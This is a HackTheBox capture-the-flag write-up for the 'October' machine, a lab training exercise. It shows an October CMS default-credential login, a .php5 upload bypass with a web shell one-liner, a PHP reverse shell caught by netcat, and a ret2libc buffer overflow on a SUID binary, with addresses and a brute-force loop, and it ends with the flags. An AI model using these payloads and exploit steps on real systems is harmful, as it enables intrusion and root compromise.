---
layout: post
title: HackTheBox October
date: 2017-04-20
tags: [HackTheBox, Linux]
---

# Machine Synopsis

October is a fairly easy machine to gain an initial foothold on, however it presents a fair challenge for users who have never worked with NX/DEP or ASLR while exploiting buffer overflows. ([Source](https://www.hackthebox.com/machines/october))

# Enumeration

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/October]
└─# nmap -sC -sV -A 10.10.10.16
Nmap scan report for 10.10.10.16
Host is up (0.0096s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 79:b1:35:b6:d1:25:12:a3:0c:b5:2e:36:9c:33:26:28 (DSA)
|   2048 16:08:68:51:d1:7b:07:5a:34:66:0d:4c:d0:25:56:f5 (RSA)
|   256 e3:97:a7:92:23:72:bf:1d:09:88:85:b6:6c:17:4e:85 (ECDSA)
|_  256 89:85:90:98:20:bf:03:5d:35:7f:4a:a9:e1:1b:65:31 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: October CMS - Vanilla
| http-methods: 
|_  Potentially risky methods: PUT PATCH DELETE
|_http-server-header: Apache/2.4.7 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   16.12 ms 10.10.14.1
2   16.33 ms 10.10.10.16

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.47 seconds
```

It looks like they are hosting a website using `October CMS`. Let’s check it out!

![website](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/October/website.png?raw=true)

Whenever we know that there’s a website, we should run a `gobuster` scan.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/October]
└─# gobuster dir -u http://10.10.10.16 -k -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
...
/blog                 (Status: 200) [Size: 4262]
/forum                (Status: 200) [Size: 9589]
/themes               (Status: 301) [Size: 310] [--> http://10.10.10.16/themes/]
/modules              (Status: 301) [Size: 311] [--> http://10.10.10.16/modules/]
/account              (Status: 200) [Size: 5091]    
/tests                (Status: 301) [Size: 309] [--> http://10.10.10.16/tests/]  
/storage              (Status: 301) [Size: 311] [--> http://10.10.10.16/storage/]
/plugins              (Status: 301) [Size: 311] [--> http://10.10.10.16/plugins/]
/backend              (Status: 302) [Size: 400] [--> http://10.10.10.16/backend/backend/auth]
...
```

Oh? It looks like there’s an interesting `/backend` directory.

![backend](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/October/backend.png?raw=true)

Luckily for us, the machine was using the default credentials `admin:admin` as stated [here](https://octobercms.com/forum/post/is-there-a-default-admin-user-password-and-name).

![admin_homepage](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/October/admin_homepage.png?raw=true)

# Exploit

There’s a `/media` page that allows us to upload files.

![admin_mediapage](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/October/admin_mediapage.png?raw=true)

Perhaps we can upload some malicious files here? Before we begin, let’s search for any existing vulnerabilities with `OctoberCMS`.

I found this interesting report on [ExploitDB](https://www.exploit-db.com/exploits/41936).

```php
1. PHP upload protection bypass
-------------------------------

Authenticated user with permission to upload and manage media contents can
upload various files on the server. Application prevents the user from
uploading PHP code by checking the file extension. It uses black-list based
approach, as seen in octobercms/vendor/october/rain/src/Filesystem/
Definitions.php:blockedExtensions().

==================== source start ========================
106 <?php
107 protected function blockedExtensions()
108 {
109         return [
110                 // redacted
111                 'php',
112                 'php3',
113                 'php4',
114                 'phtml',
115                 // redacted
116         ];
117 }
====================  source end  ========================

We can easily bypass file upload restriction on those systems by using an
alternative extension, e.g if we upload sh.php5 on the server:

==================== source start ========================
<?php $_REQUEST['x']($_REQUEST['c']);
====================  source end  ========================

Code can be execute by making a following request:
http://victim.site/storage/app/media/sh.php5?x=system&c=pwd
```

Technically speaking, we should be able to bypass this protection by uploading a `.php5` file.

So let’s grab a PHP reverse shell file from [here](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) and save the file as `.php5` extension.

![upload_php5_file](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/October/upload_php5_file.png?raw=true)

Let’s start a netcat listener and execute the malicious file by clicking on the public url.

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/October]
└─# nc -nlvp 1234              
listening on [any] 1234 ...
connect to [10.10.14.11] from (UNKNOWN) [10.10.10.16] 58788
Linux october 4.4.0-78-generic #99~14.04.2-Ubuntu SMP Thu Apr 27 18:51:25 UTC 2017 i686 athlon i686 GNU/Linux
 07:47:04 up 19 min,  0 users,  load average: 10.09, 9.58, 6.19
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```

# Privilege Escalation

Now, let’s use [LinPeas](https://github.com/carlospolop/PEASS-ng/releases/download/20220417/linpeas.sh) to help us identify the possible vulnerabilities.

```bash
$ cd /tmp
$ wget http://10.10.14.11/linpeas.sh
$ chmod +x linpeas.sh
$ ./linpeas.sh 
...
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
...
-rwsr-sr-x 1 libuuid libuuid 18K Nov 24  2016 /usr/sbin/uuidd
-rwsr-xr-x 1 root root 7.3K Apr 21  2017 /usr/local/bin/ovrflw (Unknown SUID binary)
...
```

##### Alternate way to find files with SUID bit set

```bash
$ find / -perm -4000 2>/dev/null
...
/usr/local/bin/ovrflw

$ find / -perm /4000 2>/dev/null
...
/usr/local/bin/ovrflw
```

```bash
$ ls /usr/local/bin 
ovrflw

$ file ovrflw
ovrflw: setuid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=004cdf754281f7f7a05452ea6eaf1ee9014f07da, not stripped
```

It seems like an executable file. Let’s transfer the file to our machine by encoding the file with `base64` and then decode it back on our local machine.

```bash
$ cat ovrflw | base64 -w0
f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAgIMECDQAAABcEQAAAAAAADQAIAAJACgAHgAbAAYAA...

- Local machine - 
┌──(root㉿shiro)-[/home/shiro/HackTheBox/October]
└─# mousepad encoded.txt                 
                                             
┌──(root㉿shiro)-[/home/shiro/HackTheBox/October]
└─# cat encoded.txt | base64 -d > ovrflw  
                                             
┌──(root㉿shiro)-[/home/shiro/HackTheBox/October]
└─# file ovrflw        
ovrflw: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=004cdf754281f7f7a05452ea6eaf1ee9014f07da, not stripped
                                             
┌──(root㉿shiro)-[/home/shiro/HackTheBox/October]
└─# chmod +x ovrflw                                     
                                             
┌──(root㉿shiro)-[/home/shiro/HackTheBox/October]
└─# ./ovrflw         
Syntax: ./ovrflw <input string>
                         
┌──(root㉿shiro)-[/home/shiro/HackTheBox/October]
└─# ./ovrflw AAAAAA

┌──(root㉿shiro)-[/home/shiro/HackTheBox/October]
└─# ./ovrflw $(python -c 'print "A"*6969')
zsh: segmentation fault  ./ovrflw $(python -c 'print "A"*6969')
```

Let’s debug this program using [`gdb-peda`](https://github.com/longld/peda).

>   Note: if `gdb-peda` is not working properly, update your `gdb` with `sudo apt-get install gdb -y`

```bash
┌──(root㉿shiro)-[/home/shiro/HackTheBox/October]
└─# git clone https://github.com/longld/peda.git ~/peda

┌──(root㉿shiro)-[/home/shiro/HackTheBox/October]
└─# echo "source ~/peda/peda.py" >> ~/.gdbinit                                     
┌──(root㉿shiro)-[/home/shiro/HackTheBox/October]
└─# gdb ovrflw          
...
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```

As `NX` is enabled, we won’t be able to put a shellcode inside the program. Therefore, we need to make use of `ret-to-libc` to exploit this. First, we need to try and offset the `EIP`.

```bash
# Create a unique pattern of 150 bytes
gdb-peda$ pattern_create 150
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA'

# Set our input string to the unique pattern 
gdb-peda$ pset arg 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA'

gdb-peda$ pshow arg
arg[1]: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA

gdb-peda$ run
Starting program: /home/shiro/HackTheBox/October/ovrflw 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA'

# Set breakpoint at main function
gdb-peda$ break main
Breakpoint 1 at 0x8048480

gdb-peda$ run
Starting program: /home/shiro/HackTheBox/October/ovrflw 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA'
[----------------------------------registers-----------------------------------]
EAX: 0xf7fa59e8 --> 0xffffd4a0 --> 0xffffd6c6 ("LANG=en_SG.UTF-8")
EBX: 0x0 
ECX: 0xdd7140ff 
EDX: 0xffffd424 --> 0x0 
ESI: 0x2 
EDI: 0x8048380 (<_start>:	xor    ebp,ebp)
EBP: 0xffffd3e8 --> 0x0 
ESP: 0xffffd3e8 --> 0x0 
EIP: 0x8048480 (<main+3>:	and    esp,0xfffffff0)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048478 <frame_dummy+40>:	jmp    0x80483f0 <register_tm_clones>
   0x804847d <main>:	push   ebp
   0x804847e <main+1>:	mov    ebp,esp
=> 0x8048480 <main+3>:	and    esp,0xfffffff0
   0x8048483 <main+6>:	add    esp,0xffffff80
   0x8048486 <main+9>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x804848a <main+13>:	jg     0x80484ad <main+48>
   0x804848c <main+15>:	mov    eax,DWORD PTR [ebp+0xc]
[------------------------------------stack-------------------------------------]
0000| 0xffffd3e8 --> 0x0 
0004| 0xffffd3ec --> 0xf7dd6905 (<__libc_start_main+229>:	add    esp,0x10)
0008| 0xffffd3f0 --> 0x2 
0012| 0xffffd3f4 --> 0xffffd494 --> 0xffffd609 ("/home/shiro/HackTheBox/October/ovrflw")
0016| 0xffffd3f8 --> 0xffffd4a0 --> 0xffffd6c6 ("LANG=en_SG.UTF-8")
0020| 0xffffd3fc --> 0xffffd424 --> 0x0 
0024| 0xffffd400 --> 0xffffd434 --> 0x9807dcef 
0028| 0xffffd404 --> 0xf7ffdb98 --> 0xf7ffdb30 --> 0xf7fc33f0 --> 0xf7ffd9d0 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048480 in main ()
gdb-peda$ continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xffffd6c0 ("AAoAA")
EDX: 0xffffd40d ("AAoAA")
ESI: 0x2 
EDI: 0x8048380 (<_start>:	xor    ebp,ebp)
EBP: 0x6941414d ('MAAi')
ESP: 0xffffd3f0 ("ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA")
EIP: 0x41384141 ('AA8A')
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41384141
[------------------------------------stack-------------------------------------]
0000| 0xffffd3f0 ("ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA")
0004| 0xffffd3f4 ("jAA9AAOAAkAAPAAlAAQAAmAARAAoAA")
0008| 0xffffd3f8 ("AAOAAkAAPAAlAAQAAmAARAAoAA")
0012| 0xffffd3fc ("AkAAPAAlAAQAAmAARAAoAA")
0016| 0xffffd400 ("PAAlAAQAAmAARAAoAA")
0020| 0xffffd404 ("AAQAAmAARAAoAA")
0024| 0xffffd408 ("AmAARAAoAA")
0028| 0xffffd40c ("RAAoAA")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41384141 in ?? ()
```

Nice, the `EIP` was overwritten. Let’s find the exact number of bytes needed to offset it.

```bash
# Find the EIP offset
gdb-peda$ pattern_offset AA8A
1094205761 found at offset: 112

# Find the EIP address offset
gdb-peda$ pattern_offset 0x41384141 150
1094205761 found at offset: 112
```

Let’s do a sanity check that we found the correct number of bytes.

```bash
# create a 112 bytes long of A and then add BCDE
gdb-peda$ run `python -c 'print "A"*112 + "BCDE"'`
Starting program: /home/shiro/HackTheBox/October/ovrflw `python -c 'print "A"*112 + "BCDE"'`
[----------------------------------registers-----------------------------------]
EAX: 0xf7fa59e8 --> 0xffffd4c0 --> 0xffffd6c6 ("LANG=en_SG.UTF-8")
EBX: 0x0 
ECX: 0x5eba623b 
EDX: 0xffffd444 --> 0x0 
ESI: 0x2 
EDI: 0x8048380 (<_start>:	xor    ebp,ebp)
EBP: 0xffffd408 --> 0x0 
ESP: 0xffffd408 --> 0x0 
EIP: 0x8048480 (<main+3>:	and    esp,0xfffffff0)
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048478 <frame_dummy+40>:	jmp    0x80483f0 <register_tm_clones>
   0x804847d <main>:	push   ebp
   0x804847e <main+1>:	mov    ebp,esp
=> 0x8048480 <main+3>:	and    esp,0xfffffff0
   0x8048483 <main+6>:	add    esp,0xffffff80
   0x8048486 <main+9>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x804848a <main+13>:	jg     0x80484ad <main+48>
   0x804848c <main+15>:	mov    eax,DWORD PTR [ebp+0xc]
[------------------------------------stack-------------------------------------]
0000| 0xffffd408 --> 0x0 
0004| 0xffffd40c --> 0xf7dd6905 (<__libc_start_main+229>:	add    esp,0x10)
0008| 0xffffd410 --> 0x2 
0012| 0xffffd414 --> 0xffffd4b4 --> 0xffffd62b ("/home/shiro/HackTheBox/October/ovrflw")
0016| 0xffffd418 --> 0xffffd4c0 --> 0xffffd6c6 ("LANG=en_SG.UTF-8")
0020| 0xffffd41c --> 0xffffd444 --> 0x0 
0024| 0xffffd420 --> 0xffffd454 --> 0x1bc33e2b 
0028| 0xffffd424 --> 0xf7ffdb98 --> 0xf7ffdb30 --> 0xf7fc33f0 --> 0xf7ffd9d0 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048480 in main ()
gdb-peda$ continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xffffd6c0 ("ABCDE")
EDX: 0xffffd40b ("ABCDE")
ESI: 0x2 
EDI: 0x8048380 (<_start>:	xor    ebp,ebp)
EBP: 0x41414141 ('AAAA')
ESP: 0xffffd410 --> 0x0 
EIP: 0x45444342 ('BCDE') # we managed to offset the EIP to "BCDE"
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x45444342
[------------------------------------stack-------------------------------------]
0000| 0xffffd410 --> 0x0 
0004| 0xffffd414 --> 0xffffd4b4 --> 0xffffd62b ("/home/shiro/HackTheBox/October/ovrflw")
0008| 0xffffd418 --> 0xffffd4c0 --> 0xffffd6c6 ("LANG=en_SG.UTF-8")
0012| 0xffffd41c --> 0xffffd444 --> 0x0 
0016| 0xffffd420 --> 0xffffd454 --> 0x1bc33e2b 
0020| 0xffffd424 --> 0xf7ffdb98 --> 0xf7ffdb30 --> 0xf7fc33f0 --> 0xf7ffd9d0 --> 0x0 
0024| 0xffffd428 --> 0xf7fc3420 --> 0x804828a ("GLIBC_2.0")
0028| 0xffffd42c --> 0xf7fa3000 --> 0x1ead6c 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x45444342 in ?? ()
```

Now we just have to find the address of `system`, `exit` and `/bin/sh` to complete the exploit.

##### First method

First, we have to find the address of `libc`. 

```bash
$ ldd ovrflw | grep libc
	libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75b5000)
```

Then, we have to get the offsets for `system` and `exit` in the `libc` library.

```bash
$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep -e " system@" -e " exit@"
   139: 00033260    45 FUNC    GLOBAL DEFAULT   12 exit@@GLIBC_2.0
  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0
$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep "/bin/"
 162bac /bin/sh
 164b10 /bin/csh
```

Then we can just [calculate](https://www.gigacalculator.com/calculators/hexadecimal-calculator.php) the address for each function.

```bash
# hex of libc.so.6 + hex of system
system: 0xb75b5000 + 0x40310 = 0xb75f5310
# hex of libc.so.6 + hex of exit
exit: 0xb75b5000 + 0x33260 = 0xb75e8260
# hex of libc.so.6 + hex of bin/sh
"/bin/sh": 0xb75b5000 + 0x162bac = 0xb7717bac
```

##### Second method

```bash
- Victim machine - 
$ gdb ovrflw
...
(gdb) b main
Breakpoint 1 at 0x8048480
(gdb) r
Starting program: /usr/local/bin/ovrflw 

Breakpoint 1, 0x08048480 in main ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xb75f2310 <__libc_system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb75e5260 <__GI_exit>
(gdb) find 0xb75f2310, +99999999, "/bin/sh"
0xb7714bac
warning: Unable to access 16000 bytes of target memory at 0xb775ef34, halting search.
1 pattern found.
```

| `system`  | `0xb75f2310` |
| --------- | ------------ |
| `exit`    | `0xb75e5260` |
| `/bin/sh` | `0xb7714bac` |

Using either method to find the addresses, we can finally craft the exploit payload.

Our exploit will be crafted in this format: `RANDOM + SYSTEM + EXIT + /bin/sh`.

```bash
Method 1:
$(python -c "print('A'*112 + '\x10\x53\x5f\xb7' + '\x60\x82\x5e\xb7'  + '\xac\x7b\x71\xb7')")

Method 2:
$(python -c "print('A'*112 + '\x10\x23\x5f\xb7' + '\x60\x52\x5e\xb7' + '\xac\x4b\x71\xb7')")
```

However, ASLR was enabled for the program, which means that we have to loop the exploit until we get a shell.

```bash
Method 1:
while true; do /usr/local/bin/ovrflw $(python -c "print('A'*112 + '\x10\x53\x5f\xb7' + '\x60\x82\x5e\xb7'  + '\xac\x7b\x71\xb7')"); done

Method 2:
while true; do /usr/local/bin/ovrflw $(python -c "print('A'*112 + '\x10\x23\x5f\xb7' + '\x60\x52\x5e\xb7' + '\xac\x4b\x71\xb7')"); done
```

```bash
Method 1:
$ while true; do /usr/local/bin/ovrflw $(python -c "print('A'*112 + '\x10\x53\x5f\xb7' + '\x60\x82\x5e\xb7'  + '\xac\x7b\x71\xb7')"); done
...
Segmentation fault (core dumped)
Trace/breakpoint trap (core dumped)
Segmentation fault (core dumped)
Illegal instruction (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
whoami
root

Method 2:
$ while true; do /usr/local/bin/ovrflw $(python -c "print('A'*112 + '\x10\x23\x5f\xb7' + '\x60\x52\x5e\xb7' + '\xac\x4b\x71\xb7')"); done
Illegal instruction (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
Segmentation fault (core dumped)
whoami
root
ls
harry
cat /home/harry/user.txt
6857518d85b43a12850d112cb0d6e6f3
cat /root/root.txt
09411aa43ef081f65162196b2c51a3bf
```
